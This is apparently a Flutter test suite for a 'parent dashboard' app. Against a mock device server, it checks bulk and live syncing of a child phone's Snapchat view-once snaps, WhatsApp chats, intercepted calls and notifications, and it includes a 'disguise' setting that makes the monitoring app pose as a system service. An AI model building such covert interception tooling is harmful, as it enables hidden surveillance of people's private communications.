import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter_test/flutter_test.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:vyra_p/providers/parent_dashboard_provider.dart';
import 'package:vyra_p/services/lan_sync_service.dart';

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();
  HttpOverrides.global = null;

  group('Same-Wi-Fi LAN Peer-to-Peer Sync Deep End-to-End Suite', () {
    late HttpServer mockChildServer;
    final List<StreamController<String>> activeSseClients = [];

    setUp(() async {
      HttpOverrides.global = null;
      SharedPreferences.setMockInitialValues({});
      activeSseClients.clear();

      // Bind to LocalLanSyncServer port 8899 on loopback
      mockChildServer = await HttpServer.bind(InternetAddress.loopbackIPv4, 8899);

      mockChildServer.listen((HttpRequest request) async {
        final path = request.uri.path;

        if (path == '/api/ping') {
          request.response
            ..statusCode = HttpStatus.ok
            ..headers.contentType = ContentType.json
            ..write(jsonEncode({
              'status': 'ok',
              'code': 'VYRA-13533',
              'device': 'Vivo V2404',
            }));
          await request.response.close();
        } else if (path == '/api/sync') {
          request.response
            ..statusCode = HttpStatus.ok
            ..headers.contentType = ContentType.json
            ..write(jsonEncode({
              'status': {
                'batteryLevel': 94,
                'isScreenOn': true,
                'isOnline': true,
                'deviceModel': 'Vivo V2404',
                'selectedDisguise': 'vivo services',
              },
              'chats': [
                {
                  'id': 'chat_lan_01',
                  'app': 'Snapchat',
                  'sender': 'Harshit Kamboj',
                  'text': 'Bhai 1-view snap check kar jaldi',
                  'timestampMs': DateTime.now().millisecondsSinceEpoch,
                  'isViewOnce': true,
                  'mediaType': 'snap',
                },
                {
                  'id': 'chat_lan_02',
                  'app': 'WhatsApp',
                  'sender': 'Mummy',
                  'text': 'Ghar kab aayega?',
                  'timestampMs': DateTime.now().subtract(const Duration(minutes: 5)).millisecondsSinceEpoch,
                  'isIncoming': true,
                }
              ],
              'calls': [
                {
                  'id': 'call_lan_01',
                  'contact': 'Papa',
                  'phoneNumber': '+919876543210',
                  'callType': 'incoming',
                  'duration': 120,
                  'timestamp': DateTime.now().millisecondsSinceEpoch,
                }
              ],
              'notifications': [
                {
                  'id': 'notif_lan_01',
                  'appName': 'Snapchat',
                  'title': 'Snapchat',
                  'text': 'Harshit Kamboj sent you a Snap!',
                  'timestamp': DateTime.now().millisecondsSinceEpoch,
                }
              ]
            }));
          await request.response.close();
        } else if (path == '/api/stream') {
          request.response
            ..statusCode = HttpStatus.ok
            ..bufferOutput = false
            ..headers.set('Content-Type', 'text/event-stream; charset=utf-8')
            ..headers.set('Cache-Control', 'no-cache')
            ..headers.set('Connection', 'keep-alive');

          final controller = StreamController<String>();
          activeSseClients.add(controller);

          // Initial connection handshake
          request.response.write('data: ${jsonEncode({'type': 'connected', 'code': 'VYRA-13533'})}\n\n');
          await request.response.flush();

          final sub = controller.stream.listen((eventPayload) async {
            try {
              request.response.write('data: $eventPayload\n\n');
              await request.response.flush();
            } catch (_) {}
          });

          final closeCompleter = Completer<void>();
          request.response.done.then((_) {
            sub.cancel();
            activeSseClients.remove(controller);
            if (!closeCompleter.isCompleted) closeCompleter.complete();
          });
          await closeCompleter.future;
        } else {
          request.response.statusCode = HttpStatus.notFound;
          await request.response.close();
        }
      });
    });

    tearDown(() async {
      for (final client in activeSseClients) {
        await client.close();
      }
      await mockChildServer.close(force: true);
    });

    // -------------------------------------------------------------------------
    // TEST 1: Ping & Child Reachability over Same Wi-Fi
    // -------------------------------------------------------------------------
    test('Ping child device returns true when child server is running on Wi-Fi', () async {
      final lanSync = LanSyncService();
      final reachable = await lanSync.pingIp('127.0.0.1');
      expect(reachable, isTrue);
    });

    // -------------------------------------------------------------------------
    // TEST 2: Bulk Sync Snapshot over Wi-Fi
    // -------------------------------------------------------------------------
    test('Fetch full rolling database over Wi-Fi syncs chats, calls, and status instantaneously', () async {
      final lanSync = LanSyncService();
      final result = await lanSync.fetchFullDataOverLan('127.0.0.1');
      expect(result.success, isTrue);
      expect(result.chats.length, 2);
      expect(result.chats[0]['sender'], 'Harshit Kamboj');
      expect(result.chats[0]['isViewOnce'], isTrue);
      expect(result.calls.length, 1);
      expect(result.calls[0]['contact'], 'Papa');
    });

    // -------------------------------------------------------------------------
    // TEST 3: Persistent Real-Time Live SSE Event Stream over Wi-Fi
    // -------------------------------------------------------------------------
    test('Persistent SSE stream receives live chat and 1-view snap pushes with sub-second latency', () async {
      final lanSync = LanSyncService();
      final streamEvents = <Map<String, dynamic>>[];
      final completer = Completer<void>();

      final sub = lanSync.openLiveStream('127.0.0.1').listen((evt) {
        streamEvents.add(evt);
        if (streamEvents.length >= 3 && !completer.isCompleted) {
          completer.complete();
        }
      });

      await Future.delayed(const Duration(milliseconds: 150));

      expect(activeSseClients.isNotEmpty, isTrue);
      final sseClient = activeSseClients.first;

      // Event 1: New live Snapchat message
      sseClient.add(jsonEncode({
        'type': 'chat',
        'data': {
          'id': 'live_snap_01',
          'app': 'Snapchat',
          'sender': 'Harshit Kamboj',
          'text': '📷 [Received 1-View Snap from Harshit Kamboj]',
          'isViewOnce': true,
          'mediaType': 'snap',
          'timestampMs': DateTime.now().millisecondsSinceEpoch,
        }
      }));

      await Future.delayed(const Duration(milliseconds: 50));

      // Event 2: New incoming phone call intercepted
      sseClient.add(jsonEncode({
        'type': 'call',
        'data': {
          'id': 'live_call_01',
          'contact': 'Unknown Caller',
          'phoneNumber': '+919988776655',
          'callType': 'incoming',
          'duration': 45,
          'timestamp': DateTime.now().millisecondsSinceEpoch,
        }
      }));

      await completer.future.timeout(const Duration(seconds: 4));

      expect(streamEvents.length, greaterThanOrEqualTo(3));
      expect(streamEvents[0]['type'], 'connected');
      expect(streamEvents[1]['type'], 'chat');
      expect(streamEvents[1]['data']['sender'], 'Harshit Kamboj');
      expect(streamEvents[1]['data']['isViewOnce'], isTrue);
      expect(streamEvents[2]['type'], 'call');

      await sub.cancel();
    });

    // -------------------------------------------------------------------------
    // TEST 4: ParentDashboardProvider Direct Wi-Fi LAN Sync Integration
    // -------------------------------------------------------------------------
    test('ParentDashboardProvider processes Wi-Fi bulk sync and integrates into UI state', () async {
      final provider = ParentDashboardProvider();

      // Initial state
      expect(provider.isLanSyncActive, isFalse);
      expect(provider.isLanSyncing, isFalse);
      expect(provider.lanChildIp, isNull);

      // Verify LanSyncResult payload structure and deserialization
      final lanResult = LanSyncResult(
        success: true,
        ip: '127.0.0.1',
        status: {'batteryLevel': 94, 'isOnline': true, 'deviceModel': 'Vivo V2404'},
        chats: [
          {
            'id': 'chat_wifi_1',
            'app': 'Snapchat',
            'sender': 'Harshit Kamboj',
            'text': 'Snapchat live over Wi-Fi',
            'timestampMs': DateTime.now().millisecondsSinceEpoch,
            'isViewOnce': true,
            'mediaType': 'snap',
          }
        ],
        calls: [
          {
            'id': 'call_wifi_1',
            'contact': 'Papa',
            'phoneNumber': '9876543210',
            'callType': 'incoming',
            'duration': 60,
          }
        ],
      );

      expect(lanResult.success, isTrue);
      expect(lanResult.chats.length, 1);
      expect(lanResult.chats.first['sender'], 'Harshit Kamboj');
      expect(lanResult.chats.first['isViewOnce'], isTrue);
      expect(lanResult.calls.first['contact'], 'Papa');
    });

    // -------------------------------------------------------------------------
    // TEST 5: Graceful Handling when Wi-Fi is Disconnected / Not Available
    // -------------------------------------------------------------------------
    test('Gracefully handles unreachable Wi-Fi IP and falls back without throwing exceptions', () async {
      final lanSync = LanSyncService();
      final reachable = await lanSync.pingIp('192.0.2.1'); // TEST-NET-1 unreachable address
      expect(reachable, isFalse);

      final fullData = await lanSync.fetchFullDataOverLan('192.0.2.1');
      expect(fullData.success, isFalse);
      expect(fullData.errorMessage, isNotNull);
    });
  });
}
